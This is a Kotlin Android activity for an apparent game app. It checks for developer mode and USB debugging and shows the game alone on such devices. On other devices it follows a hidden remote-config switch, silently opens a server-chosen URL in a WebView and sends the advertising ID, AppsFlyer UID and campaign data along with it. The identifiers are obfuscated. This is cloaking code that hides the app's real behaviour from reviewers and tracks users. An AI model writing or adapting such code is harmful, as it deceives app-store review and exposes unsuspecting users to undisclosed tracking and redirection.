package crapto.quantem.ao

import android.content.Context
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.provider.Settings
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import crapto.quantem.ao.databinding.ActivityMainBinding
import crapto.quantem.ao.util.*
import crapto.quantem.ao.util.manager.DataStoreManager
import crapto.quantem.ao.util.network.internetConnection
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
    companion object {

        lateinit var binding      : ActivityMainBinding
        lateinit var navController: NavController

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webViewURL = "google.com"

        val lottie by lazy { Lottie(binding) }
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        log("Network = ${internetConnection()}")
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            lottie.showLoader()
            coroutine.launch(Dispatchers.IO) {
                try {
                    checkDataStore()
                    //startFragmentIdFlow.emit(R.id.libGDXFragment)
                } catch (e: Exception) {
                    log("e: ${e.message}")
                    startFragmentIdFlow.emit(R.id.libGDXFragment)
                }

                launch(Dispatchers.Main) {
                    startFragmentIdFlow.collect { fragmentId ->
                        requestedOrientation = when (fragmentId) {
                            R.id.libGDXFragment -> {

//                            binding.root.also { rootCL ->
//                                ConstraintSet().apply {
//                                    clone(rootCL)
//                                    constrainPercentWidth(binding.lottieLoader.id, .2f)
//                                    setHorizontalBias(binding.lottieLoader.id, .9f)
//                                }.applyTo(rootCL)
//                            }
                                ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                            }
                            R.id.webViewFragment -> {
                                window.navigationBarColor = ContextCompat.getColor(this@MainActivity,
                                    R.color.black
                                )
                                ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                            }
                            else                 -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        setStartDestination(fragmentId)
                    }
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        exit()
    }

    override fun exit() {
        cancelCoroutinesAll(coroutine)
        finishAndRemoveTask()
        exitProcess(0)
    }

//    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
//        super.onActivityResult(requestCode, resultCode, data)
//        webViewFragment?.onActivityResult(requestCode, resultCode, data)
//    }



    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
    }

    private fun setStartDestination(
        @IdRes destinationId: Int,
        args: Bundle? = null
    ) {
        with(navController) {
            navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, args) }
        }
    }

    // ------------------------------------------------------------------------
    // Logic
    // ------------------------------------------------------------------------

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Good" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = Pik | link = $it")
                        webViewURL = it
                        startFragmentIdFlow.emit(
                            R.id.webViewFragment
                        )
                        lottie.hideLoader()
                    }
                }
                "Bad"  -> {
                    log("DataStoreManager Key = Sik")
                    startFragmentIdFlow.emit(R.id.libGDXFragment)
                }
                else   -> {
                    log("DataStoreManager Key = Mik")
                    if (isDevMode(this@MainActivity) && isUSB(this@MainActivity)) startFragmentIdFlow.emit(R.id.libGDXFragment)
                    else try {
                        Firebase.remoteConfig.apply {
                            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
                            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                                if (task.isSuccessful) {
                                    val jsonStr = getString("Caffe")
                                    log("success = $jsonStr")
                                    JSONObject(jsonStr).also { jsonObj ->
                                        coroutine.launch(Dispatchers.IO) {
                                            getSoska(jsonObj.getString("factor"), jsonObj.getBoolean("various"))
                                        }
                                    }

                                } else {
                                    startFragmentIdFlow.tryEmit(
                                        R.id.libGDXFragment
                                    )
                                    log("fail = ${this.all}")
                                }
                            }
                        }
                   } catch (e: Exception) {
                       startFragmentIdFlow.emit(
                           R.id.libGDXFragment
                       )
                   }
                }
            }
        }
    }

    private suspend fun getSoska(pinokolade: String, dukaty: Boolean) {
        if (dukaty) {
            withContext(Dispatchers.Main) {
                val completer = Completer(coroutine, 2) {
                    val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
                    val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                    val doone = pinokolade + "?" +
                            "adverted=${advertisingId}&" +
                            "applayer=${appsflyerUID}&" +
                            "campus=${AppsflyerUtil.campaignFlow.value}&" +
                            "depkamp=${FacebookUtil.deeplinkFlow.value}"

                    log("Gorodka = $doone")

                    webViewURL = doone
                    startFragmentIdFlow.tryEmit(
                        R.id.webViewFragment
                    )
                    lottie.hideLoader()

                    coroutine.launch(Dispatchers.IO) {
                        DataStoreManager.Key.update { "Good" }
                        DataStoreManager.Link.update { doone }
                    }
                }

                AppsflyerUtil.initialize(this@MainActivity)
                coroutine.launch {
                    AppsflyerUtil.campaignFlow.collect {
                        log("campaignFlow = $it")
                        if (it != AppsflyerUtil.CAMPAIGN_INIT_VALUE) completer.complete()
                    }
                }

                FacebookUtil.initialize()
                coroutine.launch {
                    FacebookUtil.deeplinkFlow.collect {
                        log("deeplinkFlow = $it")
                        if (it != FacebookUtil.DEEPLINK_INIT_VALUE) completer.complete()
                    }
                }
            }
        } else {
            withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Bad" } }
            startFragmentIdFlow.emit(R.id.libGDXFragment)
        }
    }

    fun isDevMode(context: Context): Boolean {
        return Settings.Secure.getInt(context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
    }

    fun isUSB(context: Context): Boolean = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ADB_ENABLED, 0) != 0

}